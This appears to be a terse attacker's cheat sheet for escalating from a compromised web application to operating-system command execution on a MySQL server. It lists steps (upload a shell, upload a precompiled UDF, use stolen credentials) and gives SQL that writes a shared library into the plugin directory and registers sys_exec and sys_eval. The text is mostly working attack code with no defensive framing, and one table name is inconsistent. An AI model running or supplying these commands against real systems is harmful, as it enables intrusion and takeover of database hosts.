#. comprimised webapp
#. upload rc shell
#. upload precompiled UDF
#. use credentials of webapp / priveleged user

.. code:: sql

    create table udf_stager ( payload mediumblob ) Engine=InnoDB;
    INSERT INTO udf_stage VALUES ('<binary data>');
    SELECT @@GLOBAL.plugin_dir
    SELECT payload from udf_stager INTO DUMPFILE CONCAT(@@GLOBAL.plugin_dir,'/lib_mysqludf_sys.so');

.. code:: sql

    DROP FUNCTION IF EXISTS lib_mysqludf_sys_info;
    DROP FUNCTION IF EXISTS sys_get;
    DROP FUNCTION IF EXISTS sys_set;
    DROP FUNCTION IF EXISTS sys_exec;
    DROP FUNCTION IF EXISTS sys_eval;

    CREATE FUNCTION lib_mysqludf_sys_info RETURNS string SONAME 'lib_mysqludf_sys.so';
    CREATE FUNCTION sys_get RETURNS string SONAME 'lib_mysqludf_sys.so';
    CREATE FUNCTION sys_set RETURNS int SONAME 'lib_mysqludf_sys.so';
    CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';
    CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';
